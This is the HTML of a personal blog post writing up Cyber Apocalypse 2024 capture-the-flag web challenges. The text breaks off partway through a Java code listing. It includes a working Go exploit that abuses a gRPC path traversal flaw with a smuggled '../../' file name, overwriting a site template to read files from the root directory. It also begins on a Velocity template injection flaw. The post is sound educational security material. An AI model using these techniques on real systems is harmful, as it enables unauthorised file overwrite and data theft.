<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Cyber Apocalypse 2024 - 4x Web Challenges Writeup" /><meta property="og:locale" content="en" /><meta name="description" content="I participated as a member of team CibersecUNI. In the web category we solved 6/9 challenges as a team. In this writeup I will go through the ones that I have solved:" /><meta property="og:description" content="I participated as a member of team CibersecUNI. In the web category we solved 6/9 challenges as a team. In this writeup I will go through the ones that I have solved:" /><link rel="canonical" href="https://s4yhii.github.io/posts/CyberApocalypse-CTF2024-Web/" /><meta property="og:url" content="https://s4yhii.github.io/posts/CyberApocalypse-CTF2024-Web/" /><meta property="og:site_name" content="s4yhii‚Äôs Blog" /><meta property="og:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/htbimage.jpg" /><meta property="og:image:height" content="1400" /><meta property="og:image:width" content="700" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-03-14T08:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/htbimage.jpg" /><meta property="twitter:title" content="Cyber Apocalypse 2024 - 4x Web Challenges Writeup" /><meta name="twitter:site" content="@s4yhii" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-03-28T10:19:16-05:00","datePublished":"2024-03-14T08:00:00-05:00","description":"I participated as a member of team CibersecUNI. In the web category we solved 6/9 challenges as a team. In this writeup I will go through the ones that I have solved:","headline":"Cyber Apocalypse 2024 - 4x Web Challenges Writeup","image":{"height":1400,"width":700,"url":"https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/htbimage.jpg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4yhii.github.io/posts/CyberApocalypse-CTF2024-Web/"},"url":"https://s4yhii.github.io/posts/CyberApocalypse-CTF2024-Web/"}</script><title>Cyber Apocalypse 2024 - 4x Web Challenges Writeup | s4yhii's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="s4yhii's Blog"><meta name="application-name" content="s4yhii's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/streams/dance-pikachu.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">s4yhii's Blog</a></div><div class="site-subtitle font-italic">Appsec blog, CTF write-ups and more</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/s4yhii" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/s4yhii" aria-label="twitter" target="_blank" rel="noopener"> <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/jesusluj4n" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://app.hackthebox.com/profile/274780" aria-label="HackTheBox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Cyber Apocalypse 2024 - 4x Web Challenges Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Cyber Apocalypse 2024 - 4x Web Challenges Writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1710421200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 14, 2024 </em> </span> <span> Updated <em class="" data-ts="1743175156" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 28, 2025 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 1400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/htbimage.jpg" class="preview-img bg" alt="Preview Image" width="700" height="1400" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/s4yhii">Jesus Lujan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2096 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><p>I participated as a member of team <strong>CibersecUNI</strong>. In the web category we solved 6/9 challenges as a team. In this writeup I will go through the ones that I have solved:</p><ul><li><a href="#testimonial">Testimonial</a><li><a href="#labyrinth-linguist">Labyrinth Linguist</a><li><a href="#timekorp">TimeKORP</a><li><a href="#locktalk">Locktalk</a></ul><h1 id="testimonial">Testimonial</h1><p>As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction‚Äôs hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.</p><ul><li>üê≥¬†<em>Instancer</em> 2 IP (web ui and Grpc server)<li>üì¶¬†<a href="https://github.com/s4yhii/s4yhii.github.io/raw/master/assets/zip/web_testimonial.zip">web_testimonial.zip</a></ul><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313185148.png" alt="" data-proofer-ignore></p><p>By looking at the file structure I could tell it‚Äôs a Golang app where you can send testimonials (name and content).</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313185926.png" alt="" data-proofer-ignore></p><p>We get 2 ips in the challenge, one is the web interface and the other is the <strong>Grpc</strong> server.</p><p>When observing the functions of the website, we can think of stealing the cookies via stored XSS, but reviewing the code, there is no admin-type bot that is reviewing the testimonials.</p><p><code class="language-plaintext highlighter-rouge">err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)</code>:This block writes the received testimonial to a file located in the directory <code class="language-plaintext highlighter-rouge">public/testimonials</code>, with the name specified in the <code class="language-plaintext highlighter-rouge">Customer</code> field of the request.</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="p">(</span><span class="n">s</span> <span class="o">*</span><span class="n">server</span><span class="p">)</span> <span class="n">SubmitTestimonial</span><span class="p">(</span><span class="n">ctx</span> <span class="n">context</span><span class="o">.</span><span class="n">Context</span><span class="p">,</span> <span class="n">req</span> <span class="o">*</span><span class="n">pb</span><span class="o">.</span><span class="n">TestimonialSubmission</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="n">pb</span><span class="o">.</span><span class="n">GenericReply</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="n">req</span><span class="o">.</span><span class="n">Customer</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
		<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"Name is required"</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="n">req</span><span class="o">.</span><span class="n">Testimonial</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
		<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"Content is required"</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">WriteFile</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"public/testimonials/%s"</span><span class="p">,</span> <span class="n">req</span><span class="o">.</span><span class="n">Customer</span><span class="p">),</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">Testimonial</span><span class="p">),</span> <span class="m">0644</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">err</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="o">&amp;</span><span class="n">pb</span><span class="o">.</span><span class="n">GenericReply</span><span class="p">{</span><span class="n">Message</span><span class="o">:</span> <span class="s">"Testimonial submitted successfully"</span><span class="p">},</span> <span class="no">nil</span>
<span class="p">}</span>
</pre></table></code></div></div><p>On the server, there is a <strong>directory traversal</strong> vulnerability in the handling of the client path. The Testimonial <strong>Customer field</strong> is used to specify the file location in which the testimonial will be stored. If this field is not properly validated and the inclusion of relative paths is allowed, we can manipulate this field to navigate outside the expected directory, like the root directory.</p><p>We will use this method to overwrite the content of the html website, which is located in the path <code class="language-plaintext highlighter-rouge">../../view/home/index.templ</code>.</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>
<span class="k">func</span> <span class="n">GetTestimonials</span><span class="p">()</span> <span class="p">[]</span><span class="kt">string</span> <span class="p">{</span>
	<span class="n">fsys</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">DirFS</span><span class="p">(</span><span class="s">"public/testimonials"</span><span class="p">)</span>	
	<span class="n">files</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">fs</span><span class="o">.</span><span class="n">ReadDir</span><span class="p">(</span><span class="n">fsys</span><span class="p">,</span> <span class="s">"."</span><span class="p">)</span>		
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Error reading testimonials: %v"</span><span class="p">,</span> <span class="n">err</span><span class="p">)}</span>
	<span class="p">}</span>
	<span class="k">var</span> <span class="n">res</span> <span class="p">[]</span><span class="kt">string</span>
	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">file</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">files</span> <span class="p">{</span>
		<span class="n">fileContent</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">fs</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">fsys</span><span class="p">,</span> <span class="n">file</span><span class="o">.</span><span class="n">Name</span><span class="p">())</span>
		<span class="n">res</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="kt">string</span><span class="p">(</span><span class="n">fileContent</span><span class="p">))</span>		
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">res</span>
<span class="p">}</span>

<span class="n">templ</span> <span class="n">Testimonials</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">item</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">GetTestimonials</span><span class="p">()</span> <span class="p">{</span>
    <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s">"col-md-4"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s">"card mb-4"</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s">"card-body"</span><span class="o">&gt;</span>
                <span class="o">&lt;</span><span class="n">p</span> <span class="n">class</span><span class="o">=</span><span class="s">"card-text"</span><span class="o">&gt;</span><span class="s">"{item}"</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
                <span class="o">&lt;</span><span class="n">p</span> <span class="n">class</span><span class="o">=</span><span class="s">"text-muted"</span><span class="o">&gt;-</span> <span class="n">Anonymous</span> <span class="n">Testifier</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
            <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
        <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This is done by changing the path of <code class="language-plaintext highlighter-rouge">public/testimonials</code> to the <code class="language-plaintext highlighter-rouge">root directory /</code>, in this way it will read all the files inside the root directory, which is where the <strong>flag</strong> is located.</p><p>I use copilot to help me build a script in go that:</p><ol><li>Set up a connection to the server<li>Use the connection to create a new client<li>Create a TestimonialSubmission message (replacing public/testimonial to /)<li>Call the SubmitTestimonial method</ol><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
	<span class="s">"context"</span>
	<span class="s">"fmt"</span>
	<span class="s">"log"</span>
	<span class="s">"os"</span>

	<span class="n">pb</span> <span class="s">"pb"</span>

	<span class="s">"google.golang.org/grpc"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="c">// Set up a connection to the server.</span>
	<span class="n">conn</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">grpc</span><span class="o">.</span><span class="n">Dial</span><span class="p">(</span><span class="s">"83.136.249.230:43168"</span><span class="p">,</span> <span class="n">grpc</span><span class="o">.</span><span class="n">WithInsecure</span><span class="p">())</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">log</span><span class="o">.</span><span class="n">Fatalf</span><span class="p">(</span><span class="s">"Did not connect: %v"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">defer</span> <span class="n">conn</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>

	<span class="c">// Use the connection to create a new client</span>
	<span class="n">client</span> <span class="o">:=</span> <span class="n">pb</span><span class="o">.</span><span class="n">NewRickyServiceClient</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

	<span class="c">// Create a TestimonialSubmission message</span>
	<span class="n">testimonial</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">pb</span><span class="o">.</span><span class="n">TestimonialSubmission</span><span class="p">{</span>
		<span class="n">Customer</span><span class="o">:</span>    <span class="s">"../../view/home/index.templ"</span><span class="p">,</span>
		<span class="n">Testimonial</span><span class="o">:</span> <span class="s">"package home</span><span class="se">\n\n</span><span class="s">import (</span><span class="se">\n\t\"</span><span class="s">os</span><span class="se">\"\n</span><span class="s">)</span><span class="se">\n\n</span><span class="s">templ Index() {</span><span class="se">\n\t</span><span class="s">@layout.App(true) {</span><span class="se">\n</span><span class="s">&lt;div class=</span><span class="se">\"</span><span class="s">container</span><span class="se">\"</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">  &lt;section&gt;</span><span class="se">\n</span><span class="s">      &lt;div class=</span><span class="se">\"</span><span class="s">row</span><span class="se">\"</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">          @Testimonials()</span><span class="se">\n</span><span class="s">      &lt;/div&gt;</span><span class="se">\n</span><span class="s">  &lt;/section&gt;</span><span class="se">\n</span><span class="s">&lt;/div&gt;</span><span class="se">\n</span><span class="s">}</span><span class="se">\n\n</span><span class="s">func GetTestimonials() []string {</span><span class="se">\n\t</span><span class="s">fsys := os.DirFS(</span><span class="se">\"</span><span class="s">/</span><span class="se">\"</span><span class="s">)</span><span class="se">\n\t</span><span class="s">files, err := fs.ReadDir(fsys, </span><span class="se">\"</span><span class="s">.</span><span class="se">\"</span><span class="s">)</span><span class="se">\n\t</span><span class="s">if err != nil {</span><span class="se">\n\t\t</span><span class="s">return []string{fmt.Sprintf(</span><span class="se">\"</span><span class="s">Error reading testimonials: %v</span><span class="se">\"</span><span class="s">, err)}</span><span class="se">\n\t</span><span class="s">}</span><span class="se">\n\t</span><span class="s">var res []string</span><span class="se">\n\t</span><span class="s">for _, file := range files {</span><span class="se">\n\t\t</span><span class="s">fileContent, _ := fs.ReadFile(fsys, file.Name())</span><span class="se">\n\t\t</span><span class="s">res = append(res, string(fileContent))</span><span class="se">\n\t</span><span class="s">}</span><span class="se">\n\t</span><span class="s">return res</span><span class="se">\n</span><span class="s">}</span><span class="se">\n\n</span><span class="s">templ Testimonials() {</span><span class="se">\n</span><span class="s">  for _, item := range GetTestimonials() {</span><span class="se">\n</span><span class="s">    &lt;div&gt;</span><span class="se">\n</span><span class="s">        &lt;p&gt;{item}&lt;/p&gt;</span><span class="se">\n</span><span class="s">    &lt;/div&gt;</span><span class="se">\n</span><span class="s">  }</span><span class="se">\n</span><span class="s">}"</span><span class="p">,</span>
	<span class="p">}</span>

	<span class="c">// Call the SubmitTestimonial method</span>
	<span class="n">ctx</span> <span class="o">:=</span> <span class="n">context</span><span class="o">.</span><span class="n">Background</span><span class="p">()</span>
	<span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">SubmitTestimonial</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">testimonial</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">log</span><span class="o">.</span><span class="n">Fatalf</span><span class="p">(</span><span class="s">"Could not submit testimonial: %v"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>As you can see, in the <strong>testimonial parameter</strong> the entire content of the <strong>index.templ</strong> template is sent, to overwrite this file and display the content of the files in the / path.</p><p>Before running the script, we change the path of the <code class="language-plaintext highlighter-rouge">pb package</code> with the path of the pb folder of the challenge, in my case I copied it to the path <code class="language-plaintext highlighter-rouge">/usr/local/go/src/pb</code> to call it directly</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313194915.png" alt="" data-proofer-ignore></p><p>Get the flag. üéâ It was cool to learn about grpc and golang as well. Thanks HackTheBox. :)</p><h1 id="labyrinth-linguist">Labyrinth Linguist</h1><p>You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.</p><ul><li>üê≥¬†<em>Instancer</em><li>üì¶¬†<a href="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/zip/web_labyrinth_linguist.zip">web_labyrinth_linguist.zip</a></ul><p>This was a nice opportunity to see Velocity Set directive in action.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240310123141.png" alt="" data-proofer-ignore></p><p>By looking at the file structure and the web ui I could tell it‚Äôs a Java app that renders English text into Voxalith (kind of strange language)</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240312133119.png" alt="" data-proofer-ignore></p><p>Looking at this part of the code in main.java, it reads the content of <code class="language-plaintext highlighter-rouge">index.html</code> file and stores it in the <code class="language-plaintext highlighter-rouge">template</code> string. Then <code class="language-plaintext highlighter-rouge">getRuntimeServices()</code> initializes the Velocity runtime services and a new Velocity template object is created.</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nc">String</span> <span class="n">template</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
<span class="k">try</span> <span class="o">{</span>
    <span class="n">template</span> <span class="o">=</span> <span class="n">readFileToString</span><span class="o">(</span><span class="s">"/app/src/main/resources/templates/index.html"</span><span class="o">,</span> <span class="n">textString</span><span class="o">);</span>
<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="o">}</span>

<span class="nc">RuntimeServices</span> <span class="n">runtimeServices</span> <span class="o">=</span> <span class="nc">RuntimeSingleton</span><span class="o">.</span><span class="na">getRuntimeServices</span><span class="o">();</span>
<span class="nc">StringReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringReader</span><span class="o">(</span><span class="n">template</span><span class="o">);</span>

<span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">velocity</span><span class="o">.</span><span class="na">Template</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">velocity</span><span class="o">.</span><span class="na">Template</span><span class="o">();</span>
<span class="n">t</span><span class="o">.</span><span class="na">setRuntimeServices</span><span class="o">(</span><span class="n">runtimeServices</span><span class="o">);</span>

</pre></table></code></div></div><p>The following code is responsible to read the content of a file specified by <code class="language-plaintext highlighter-rouge">filePath</code> and store it in a <code class="language-plaintext highlighter-rouge">StringBuilder</code> named <code class="language-plaintext highlighter-rouge">content</code>. So it will replace occurrences of <code class="language-plaintext highlighter-rouge">"TEXT"</code> in each line with the <code class="language-plaintext highlighter-rouge">replacement</code> string.</p><p>The vulnerability arises because the replacement string is inserted into the file content without any validation or sanitation.</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">readFileToString</span><span class="o">(</span><span class="nc">String</span> <span class="n">filePath</span><span class="o">,</span> <span class="nc">String</span> <span class="n">replacement</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
    <span class="nc">StringBuilder</span> <span class="n">content</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
    <span class="nc">BufferedReader</span> <span class="n">bufferedReader</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

    <span class="k">try</span> <span class="o">{</span>
